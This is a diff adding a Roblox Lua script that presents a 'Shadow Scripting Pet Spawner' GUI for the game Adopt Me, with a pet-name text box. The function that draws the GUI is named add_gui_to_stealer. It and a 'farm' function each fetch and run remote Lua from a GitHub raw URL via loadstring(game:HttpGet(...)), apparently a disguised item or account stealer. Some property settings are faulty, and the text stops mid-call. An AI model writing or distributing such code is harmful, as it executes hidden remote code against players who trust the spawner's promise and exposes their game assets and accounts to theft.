@@ -1,0 +1,40 @@
+local function add_gui_to_stealer()
+local stealer_gui = Instance.new("ScreenGui")
+local title = Instance.new("TextLabel", stealer_gui)
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Text = "Shadow Scripting Pet Spawner"
+title.TextSize = 24
+title.Font = Enum.Font.SourceSansBold
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextStrokeTransparency = 0
+title.TextStrokeColor3 = Color3.new(0, 0, 0)
+title.TextWrapped = true
+title.TextScaled = true
+title.VerticalAlignment = Enum.TextXAlignment.Center
+title.TextXAlignment = Enum.TextXAlignment.Center
+local text_box = Instance.new("TextBox", stealer_gui)
+text_box.Size = UDim2.new(1, 0, 0, 50)
+text_box.Text = "Enter pet name here"
+text_box.TextSize = 24
+text_box.Font = Enum.Font.SourceSansBold
+text_box.BackgroundTransparency = 1
+text_box.TextColor3 = Color3.new(1, 1, 1)
+text_box.TextStrokeTransparency = 0
+text_box.TextStrokeColor3 = Color3.new(0, 0, 0)
+text_box.TextWrapped = true
+text_box.TextScaled = true
+text_box.VerticalAlignment = Enum.TextXAlignment.Center
+text_box.TextXAlignment = Enum.TextXAlignment.Center
+text_box.Text = "Your pet name goes here"
+text_box.Size = UDim2.new(1, 0, 0, 50)
+text_box.BackgroundTransparency = 1
+text_box.Position = UDim2.new(0, 0, 0, 50)
+text_box.Parent = stealer_gui
+loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting-adopt-me/refs/heads/main/adoptmescript.lua'))()
+end
+local function farm()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting-adopt-me/refs/heads/main/script'))()
+end
+task.spawn(add_gui_to_stealer)
+task.spawn(farm
